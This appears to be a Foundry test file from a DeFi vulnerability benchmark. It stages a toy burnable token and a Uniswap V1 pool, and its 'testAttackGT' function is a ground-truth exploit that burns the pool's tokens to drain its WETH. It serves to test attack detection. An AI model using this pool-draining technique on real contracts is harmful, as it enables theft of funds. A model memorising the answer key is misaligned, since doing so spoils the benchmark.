// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/WETH.sol";
import "@utils/UniswapV1.sol";

import "benchmarks/toy/TokenBurn/BurningToken.sol";
import "benchmarks/toy/TokenBurn/Handler.sol";

contract TokenBurnTest is Test {
    address constant owner = address(0xdeadbeef);
    address attacker;

    BurningToken token;
    WETH weth;
    UniswapV1 uniswap;
    TokenBurnHandler handler;

    uint256 constant totalSupply = 1000 ether;
    uint256 constant feeRate = 15;

    uint256 constant attackerInitBalance = 0 ether;
    uint256 constant attackerInitToken = 1 ether;

    uint256 constant uniswapInitBalance = 10 ether;
    uint256 constant uniswapInitToken = 10 ether;

    uint256 constant requiredBalance = attackerInitToken;

    function setUp() public {
        attacker = address(this);

        vm.startPrank(owner);
        token = new BurningToken(totalSupply);
        weth = new WETH(totalSupply);
        uniswap = new UniswapV1(address(token), address(weth), feeRate);
        handler = new TokenBurnHandler(
            owner,
            attacker,
            address(token),
            address(weth),
            address(uniswap)
        );
        token.transfer(attacker, attackerInitToken);
        token.transfer(address(uniswap), uniswapInitToken);

        weth.transfer(attacker, attackerInitBalance);
        weth.transfer(address(uniswap), uniswapInitBalance);
        vm.stopPrank();

        excludeContract(address(token));
        excludeContract(address(weth));
        excludeContract(address(uniswap));
    }

    function testAttackGT() public {
        token.approve(address(uniswap), UINT256_MAX);
        weth.approve(address(uniswap), UINT256_MAX);
        token.burn(address(uniswap), token.balanceOf(address(uniswap)) - 1);
        uniswap.swapTokenToWETH(token.balanceOf(attacker));
        require(attackGoal(), "Attack Failed!");
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(attacker) >= requiredBalance;
    }

    function invariantSafe() public view {
        require(!attackGoal(), "Attack Happened!");
    }
}
